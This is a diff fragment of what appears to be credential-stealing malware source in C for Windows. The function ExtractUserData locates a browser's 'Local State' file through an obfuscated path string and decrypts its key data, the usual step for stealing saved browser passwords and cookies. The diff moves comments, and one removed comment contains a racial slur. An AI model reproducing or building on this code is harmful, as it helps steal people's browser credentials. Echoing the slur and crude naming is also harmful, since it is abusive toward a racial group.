@@ -215,7 +215,7 @@ ExtractUserData(int brwsrPathOfshit,
     WCHAR *TheRealOne = TheRealOne_;
     lstrcatW(TheRealOne_, resolvedPath);
     filePath = GetFilePath((wchar_t *)L"\\Locedx765al Staedx765te");
-    lstrcatW(TheRealOne_, filePath);     // check it nigga
+    lstrcatW(TheRealOne_, filePath);
 
     finalCheckResult = verifyFileStatus(TheRealOne_);
     if (!finalCheckResult) {
@@ -224,7 +224,7 @@ ExtractUserData(int brwsrPathOfshit,
         return finalCheckResult;
     }
 
-    DecryptKeyData(TheRealOne_, (int *)&rawFileData, (int *)&fileDataSize);
+    DecryptKeyData(TheRealOne_, (int *)&rawFileData, (int *)&fileDataSize); // IM HERE
 
     resultStrBrwsrOfshit = (WCHAR *)calloc(0x104, 2);
     lstrcatW(resultStrBrwsrOfshit, brwsrOfshit);
